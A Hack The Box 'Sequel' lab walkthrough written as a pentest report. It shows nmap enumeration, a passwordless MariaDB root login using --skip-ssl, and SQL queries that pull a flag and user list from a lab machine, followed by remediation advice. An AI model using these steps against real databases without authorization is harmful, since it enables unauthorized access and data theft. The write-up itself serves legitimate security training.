# HTB Starting Point Lab Walkthrough: Sequel (Linux Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit a MySQL service on the target machine to access a database and retrieve a flag, simulating unauthenticated database access.
- **Target IP**: 10.129.95.232
- **Key Findings**: Identified a MariaDB 5.5.5-10.3.27 instance on port 3306 allowing root login without a password. Accessed the `htb` database and extracted a flag from the `config` table.
- **Impact**: In a real-world scenario, unauthenticated database access could lead to full data exposure or modification, risking critical information leakage.
- **Recommendations**: Enforce authentication, disable SSL if unsupported, and restrict network access to trusted hosts.
- **Completion Date**: July 20, 2025
- **Tools Used**: Nmap, mysql (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Sequel." The scope was limited to port scanning, MySQL service enumeration, and database access on the provided target IP. No advanced exploitation was required.

Steps were performed in a controlled lab environment using default Kali tools. A key challenge was an SSL connection error, resolved by using the `--skip-ssl` flag after reviewing the `mysql --help` output. Assumptions: Target is a Linux machine running MariaDB.

## Findings

### Finding 1: MySQL Service Identification

- **Description**: A MySQL service (MariaDB 5.5.5-10.3.27) was identified on port 3306, a standard port for MySQL databases.
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a port scan on common ports using Nmap:
        
        ```bash
        nmap -sV -p 1-9999 10.129.95.232
        ```
        
        **Flag Explanation**: `-sV` enables version detection; `-p 1-9999` scans ports 1 to 9999.  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 19:32 EDT
        Nmap scan report for 10.129.95.232
        Host is up (0.025s latency).
        Not shown: 9998 closed tcp ports (reset)
        PORT     STATE SERVICE VERSION
        3306/tcp open  mysql?
        Nmap done: 1 IP address (1 host up) scanned in 162.72 seconds
        ```
        
    2. Use Nmap’s `mysql-info.nse` script to confirm the version:
        
        ```bash
        nmap --script mysql-info.nse 10.129.95.232
        ```
        
        **Flag Explanation**: `--script mysql-info.nse` runs a script to gather MySQL server details.  
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 19:42 EDT
        Nmap scan report for 10.129.95.232
        Host is up (0.025s latency).
        Not shown: 999 closed tcp ports (reset)
        PORT     STATE SERVICE
        3306/tcp open  mysql
        | mysql-info: 
        |   Protocol: 10
        |   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
        |   Thread ID: 71
        |   Capabilities flags: 63486
        |   Some Capabilities: Support41Auth, FoundRows, Speaks41ProtocolOld, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, ConnectWithDatabase, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
        |   Status: Autocommit
        |   Salt: q2D?OP"WqU3=ym4[NS9b
        |_  Auth Plugin Name: mysql_native_password
        Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
        ```
        
- **Impact**: Confirms MySQL is active and identifies the version, enabling targeted enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: Unauthenticated MySQL Access

- **Description**: The MariaDB instance allows root login without a password after disabling SSL, revealing multiple databases, including a unique `htb` database.
- **Severity**: Critical (unauthenticated database access).
- **Steps to Reproduce**:
    1. Attempt to connect to MySQL, encountering an SSL error:
        
        ```bash
        mysql -h 10.129.95.232 -u root -p
        ```
        
        **Flag Explanation**: `-h 10.129.95.232` specifies the target host; `-u root` specifies the username; `-p` prompts for a password.  
        Output:
        
        ```bash
        Enter password: 
        ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
        ```
        
    2. Retry with SSL disabled:
        
        ```bash
        mysql --skip-ssl -h 10.129.95.232 -u root -p
        ```
        
        **Flag Explanation**: `--skip-ssl` disables SSL for the connection; `-h 10.129.95.232` specifies the host; `-u root` specifies the username; `-p` prompts for a password.  
        Output:
        
        ```bash
        Enter password: 
        Welcome to the MariaDB monitor.  Commands end with ; or \g.
        Your MariaDB connection id is 77
        Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
        MariaDB [(none)]> 
        ```
        
    3. List available databases:
        
        ```bash
        SHOW DATABASES;
        ```
        
        Output:
        
        ```bash
        +--------------------+
        | Database           |
        +--------------------+
        | htb                |
        | information_schema |
        | mysql              |
        | performance_schema |
        +--------------------+
        4 rows in set (0.028 sec)
        ```
        
- **Impact**: Unauthenticated access allows full read/write control over all databases, risking data exposure or manipulation.
- **Evidence**: MySQL login and database listing above.
- **Remediation**: Enable authentication with strong passwords; configure SSL properly or disable if unsupported.

### Finding 3: Data Exfiltration from htb Database

- **Description**: Accessed the `htb` database, enumerated its tables, and retrieved a flag from the `config` table using SQL queries.
- **Severity**: Critical (successful data exfiltration).
- **Steps to Reproduce**:
    1. Switch to the `htb` database and list tables:
        
        ```bash
        USE htb;
        SHOW TABLES;
        ```
        
        Output:
        
        ```bash
        Database changed
        +---------------+
        | Tables_in_htb |
        +---------------+
        | config        |
        | users         |
        +---------------+
        2 rows in set (0.024 sec)
        ```
        
    2. Query the `users` table:
        
        ```bash
        SELECT * FROM users;
        ```
        
        Output:
        
        ```bash
        +----+----------+------------------+
        | id | username | email            |
        +----+----------+------------------+
        |  1 | admin    | admin@sequel.htb |
        |  2 | lara     | lara@sequel.htb  |
        |  3 | sam      | sam@sequel.htb   |
        |  4 | mary     | mary@sequel.htb  |
        +----+----------+------------------+
        4 rows in set (0.025 sec)
        ```
        
    3. Query the `config` table to retrieve the flag:
        
        ```bash
        SELECT * FROM config;
        ```
        
        Output:
        
        ```bash
        +----+-----------------------+----------------------------------+
        | id | name                  | value                            |
        +----+-----------------------+----------------------------------+
        |  1 | timeout               | 60s                              |
        |  2 | security              | default                          |
        |  3 | auto_logon            | false                            |
        |  4 | max_size              | 2M                               |
        |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
        |  6 | enable_uploads        | false                            |
        |  7 | authentication_method | radius                           |
        +----+-----------------------+----------------------------------+
        7 rows in set (0.024 sec)
        ```
        
- **Impact**: Access to sensitive data demonstrates a real-world data breach scenario, potentially exposing critical information.
- **Evidence**: Command outputs and flag value (`7b4bec00d1a39e3dd4e021ec3d915da8`) above.
- **Remediation**: Remove sensitive data from databases; implement role-based access controls and encryption.

## Recommendations

- Enable authentication in MySQL/MariaDB with strong passwords (e.g., set a root password).
- Configure SSL properly or disable it if unsupported to avoid connection errors.
- Restrict network access to port 3306 using firewall rules, allowing only trusted hosts.
- Regularly scan for exposed database services using tools like Nmap or SQLmap.
- For labs like this, practice using tools like Metasploit’s `mysql_login` module to test for weak credentials.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures of MySQL queries.)
- **Key Takeaway**: Slowing down to analyze error messages (e.g., SSL errors) and reviewing `--help` output is critical for identifying solutions like `--skip-ssl`. External resources (e.g., Google) and community guidance (e.g., Shadownet) can clarify complex issues.